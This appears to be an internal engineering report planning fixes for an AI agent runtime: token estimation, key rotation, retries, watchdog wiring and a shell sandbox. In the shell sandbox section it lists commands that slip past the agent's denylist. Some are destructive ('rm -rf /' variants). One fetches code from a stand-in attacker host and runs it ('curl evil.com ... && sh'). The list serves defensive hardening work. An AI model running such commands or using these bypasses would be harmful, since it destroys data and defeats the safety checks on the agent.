# Wave 2b Research Report

**Date:** 2026-04-11
**Branch:** `full-sweep-1`
**Purpose:** Zero-risk research artifacts for 5 MODERATE/COMPLEX fixes before any code changes.

---

## Confidence Matrix

| ID | Fix | Confidence | Decision | Rationale |
|----|-----|-----------|----------|-----------|
| SWEEP-016 | Unicode token estimation | **100%** | **IMPLEMENT NOW** | 3-line drop-in replacement, pure function, errs safe, 24 callers unchanged |
| SWEEP-602 | Key rotation exhaustion | **100%** | **IMPLEMENT NOW** (minimal) | Add last-rotation timestamp + 2s cooldown. 5-line change, only SKIPS rotation, error still returns. No retry logic. |
| SWEEP-018 | Rate limit retry w/ jitter | **70%** | **DEFER — proposal only** | Touches 6 provider call sites in runtime.rs. Adds async sleep in agent loop. Needs dry-run with live provider. |
| SWEEP-227 | Wire Watchdog into production | **65%** | **DEFER — proposal only** | Multi-file change: runtime.rs constructor + main.rs startup + gateway AppState. Correct plan exists but too many touch points for zero-risk. |
| SWEEP-703 | Shell tool sandbox | **50%** | **DEFER — proposal only** | Architecture decision needed. Enhanced denylist vs containerized. Current BLOCKED_SHELL_PATTERNS is trivially bypassable but fix requires either shell parsing dependency or container integration. |

---

## SWEEP-016: Unicode Token Estimation — IMPLEMENT

### Problem
`estimate_tokens(s)` uses `s.len() / 4` (byte length). CJK text is 3 bytes/char but ~1 token/char. The estimator returns 750 for text that's actually ~1000 tokens, causing context overflow → 400 error from API.

### Fix
Option B from research: detect non-ASCII ratio, switch divisor.

```rust
pub(crate) fn estimate_tokens(s: &str) -> usize {
    let non_ascii = s.bytes().filter(|&b| b > 127).count();
    let ratio = non_ascii as f64 / s.len().max(1) as f64;
    if ratio > 0.3 {
        // CJK/Arabic-heavy: ~1.5 tokens per multi-byte char, use len/2
        s.len() / 2
    } else {
        // ASCII-heavy (English/code): ~4 chars per token
        s.len() / 4
    }
}
```

### Files changed
- `crates/temm1e-agent/src/context.rs:50-51` — main function
- `crates/temm1e-cores/src/definition.rs:79` — inline duplicate
- `crates/temm1e-cores/src/runtime.rs:298,303` — inline duplicates

### Risk analysis
- **Behavioral change for ASCII text:** NONE. `ratio < 0.3` → uses `len/4` as before.
- **Behavioral change for CJK text:** Uses `len/2` instead of `len/4`. This OVERESTIMATES (1500 vs actual 1000). Result: less content packed in context. Safe direction — prevents overflow.
- **Budget impact:** CJK users get ~50% of the history/memory they got before. This is the correct tradeoff: slightly less context is far better than a 400 error.
- **10% safety margin:** Remains at runtime.rs:249 as defense-in-depth.

### E2E test scenarios
```
# Scenario 1: English conversation (NO CHANGE)
User: "Explain quantum computing"
Expected: Same behavior as before. Token estimation unchanged.

# Scenario 2: Chinese conversation (FIXED)
User: "解释量子计算的基本原理" (Explain basic principles of quantum computing)
Expected: Context builds correctly without overflow. No 400 error.

# Scenario 3: Mixed content (SAFE)
User: "Tell me about 量子计算 in detail"
Expected: Mixed ratio <30% non-ASCII → uses len/4. Still accurate for mostly-English content.
```

---

## SWEEP-602: Key Rotation Exhaustion — IMPLEMENT (minimal)

### Problem
When all API keys are rate-limited, `rotate_key()` ping-pongs between them on every request with no cooldown. Each rotation is instant — the system burns through all keys in milliseconds.

### Fix (minimal — zero risk)
Add a last-rotation timestamp. If last rotation was <2 seconds ago, skip rotation. The error still returns — this only prevents useless key cycling.

```rust
// In AnthropicProvider struct:
last_rotation: std::sync::Mutex<std::time::Instant>,

// In rotate_key():
fn rotate_key(&self) {
    let mut last = self.last_rotation.lock().unwrap_or_else(|e| e.into_inner());
    if last.elapsed() < std::time::Duration::from_secs(2) {
        return; // Too soon — all keys likely exhausted
    }
    *last = std::time::Instant::now();
    drop(last);
    // ... existing fetch_add logic ...
}
```

### Files changed
- `crates/temm1e-providers/src/anthropic.rs` — struct field + rotate_key() guard
- `crates/temm1e-providers/src/openai_compat.rs` — same (duplicated pattern)

### Risk analysis
- **Behavioral change:** Rotation is SKIPPED when called within 2s of last rotation. The `Err(RateLimited)` still returns. No new code path is added — we only ADD an early return.
- **Existing behavior preserved:** If keys are NOT exhausted, the 2s cooldown means at most 1 rotation per 2s. Since API calls take 1-10s each, this cooldown is never hit during normal operation.
- **Thread safety:** `std::sync::Mutex` with poison recovery. Lock held for <1μs (timestamp read + compare + write). No deadlock risk.

### E2E test scenarios
```
# Scenario 1: Single key, rate limited
User sends message → 429 → rotate_key (first call, always succeeds) → error returned
User sends again within 2s → 429 → rotate_key SKIPPED (too soon) → error returned
User waits 3s and retries → 429 → rotate_key succeeds → error returned
Expected: Same user experience as before. Rate limit message shown.

# Scenario 2: Multiple keys, one rate limited
Request hits key A → 429 → rotate to B → error
Next request uses key B → succeeds
Expected: Normal rotation. 2s cooldown not triggered because requests are >2s apart.
```

---

## SWEEP-018: Rate Limit Retry w/ Jitter — PROPOSAL (defer implementation)

### Proposed approach
Add `call_provider_with_retry()` helper in runtime.rs that wraps `provider.complete()`:
1. On `Err(RateLimited)`, sleep using `CircuitBreaker::backoff_duration(attempt)` (already exists, never used)
2. Max 3 retries (matching `send_with_retry` pattern)
3. Do NOT call `circuit_breaker.record_failure()` during retries — only on final exhaustion
4. Replace 6 provider call sites in `process_message()` with the helper

### Why deferred
- **6 call sites** in `process_message()` need updating (lines 1383, 1441, 1454, 1520, 1534, 1549)
- `CompletionRequest` is moved into `complete()` — retrying requires cloning the request
- Adding `tokio::time::sleep` inside the agent loop changes timing characteristics
- Circuit breaker interaction needs careful testing (should NOT count rate limits toward failure threshold)
- Need to verify that per-user blocking (sleeping in the worker) doesn't cause message queue buildup

### Pre-implementation requirements
- [ ] Verify `CompletionRequest` derives `Clone`
- [ ] Test that sleeping in a per-chat worker doesn't starve the dispatcher
- [ ] Decide: should `format_user_error` message change to "Retrying..." during backoff?
- [ ] Decide: should the `Retry-After` header be extracted at the provider layer?

---

## SWEEP-227: Wire Watchdog into Production — PROPOSAL (defer implementation)

### Proposed 4-phase wiring plan

**Phase 1 — AgentRuntime field:**
- Add `watchdog: Option<Arc<Watchdog>>` to `AgentRuntime` struct
- Add `.with_watchdog()` builder method
- Emit `report_provider_health()` alongside existing `circuit_breaker.record_success()/record_failure()` calls

**Phase 2 — main.rs instantiation:**
- Create `Arc<Watchdog>` at startup, pass to AgentRuntime
- Emit `report_memory_health()` after `memory.store()` at line 5079

**Phase 3 — Periodic health tick:**
- Spawn task: every 60s, call `check_health()` + `should_shutdown()`
- On shutdown recommendation: cancel shared `CancellationToken` for graceful exit

**Phase 4 — Health endpoint integration:**
- Add `watchdog` to gateway `AppState`
- Update `/dashboard/api/health` to report real subsystem status

### Why deferred
- Touches `AgentRuntime` constructor (Agentic Core DIRECT)
- Requires `CancellationToken` wiring in main.rs shutdown flow (currently only `ctrl_c`)
- 4 files need coordinated changes
- Need to verify that health reports in hot path (every provider call) don't add measurable latency
- Dashboard endpoint change needs frontend coordination

### Pre-implementation requirements
- [ ] Verify `Watchdog::new()` and all methods are already exported from `temm1e_agent`
- [ ] Check if `CancellationToken` is already a dependency or needs adding
- [ ] Measure overhead of `Mutex::lock()` in `report_provider_health()` under load
- [ ] Decide: should `should_shutdown()` trigger `process::exit(1)` (for external watchdog) or graceful token cancellation?

---

## SWEEP-703: Shell Tool Sandbox — PROPOSAL (defer implementation)

### Current state
- Shell tool runs `sh -c <command>` with no restriction
- `BLOCKED_SHELL_PATTERNS` (10 patterns) uses substring matching — trivially bypassable
- `ToolDeclarations.shell_access` and `.network_access` are declared but NEVER enforced

### Research findings on bypass vectors
```
rm -rf /etc          → NOT blocked (only "rm -rf /" is)
rm -r -f /           → NOT blocked (flag order differs)
bash -c 'rm -rf /'   → NOT blocked (nested)
python3 -c "os.system('rm -rf /')" → NOT blocked
curl evil.com -o /tmp/x && sh /tmp/x → NOT blocked
```

### Proposed phased approach

**Phase 1 (LOW risk):** Enforce existing ToolDeclarations
- Wire `shell_access` check in `validate_sandbox()` — if tool declares `shell_access: false`, block any `Command::new("sh")` calls
- Wire `network_access` check — validate URLs in web_fetch against declared domains

**Phase 2 (MODERATE risk):** Enhanced denylist with command parsing
- Use `shell-words` crate (or manual split) to extract the base binary from the command
- Apply denylist at the binary level: block `rm` with `-rf` and `/` arguments, block `mkfs`, etc.
- This defeats most bypass vectors from the research

**Phase 3 (HIGH complexity):** Containerized execution
- Docker-based isolation for shell commands
- Network namespace isolation
- Read-only mount for non-workspace paths
- Requires Docker dependency — significant infrastructure change

### Why deferred
- Phase 1 is implementable but needs verification that no legitimate tool accidentally calls shell
- Phase 2 needs a shell parsing dependency decision
- Phase 3 is an architecture decision beyond this sweep
- The current RBAC gate (shell blocked for Role::User) provides baseline protection for multi-user deployments

### Pre-implementation requirements
- [ ] Audit which tools internally spawn processes — ensure `shell_access` declarations are accurate
- [ ] Evaluate `shell-words` crate for command parsing (size, security, maintenance)
- [ ] Decide: is Docker a reasonable dependency for TEMM1E?
- [ ] Check cross-platform: `sh -c` on Windows needs `cmd /c` handling
